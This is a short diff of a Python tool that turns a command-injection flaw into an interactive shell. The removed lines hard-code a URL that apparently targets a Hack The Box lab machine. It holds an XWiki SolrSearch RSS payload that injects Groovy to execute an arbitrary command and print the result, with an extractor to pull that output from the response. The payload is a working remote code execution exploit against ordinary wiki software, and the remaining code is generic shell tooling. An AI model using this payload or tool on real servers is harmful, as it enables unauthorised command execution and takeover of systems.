@@ -172,9 +172,6 @@ if __name__ == "__main__":
             endextractor = input("What is the end extractor: ")
             extractors.append((startextractor, endextractor))
             more = input("Are there more extractors (Y/N): ")
-        url = "http://wiki.editor.htb/xwiki/bin/view/Main/SolrSearch?media=rss&text=%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22^COMMAND^%22%2Eexecute%28%29%2Etext%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D"
-        method = "GET"
-        extractors = [("RSS feed for search on [", "]&lt;/title&gt;")]
         injector = Injector(url, method, body=body, extractor_pairs=extractors)
         shell = Shell(injector.send_command)
     else:
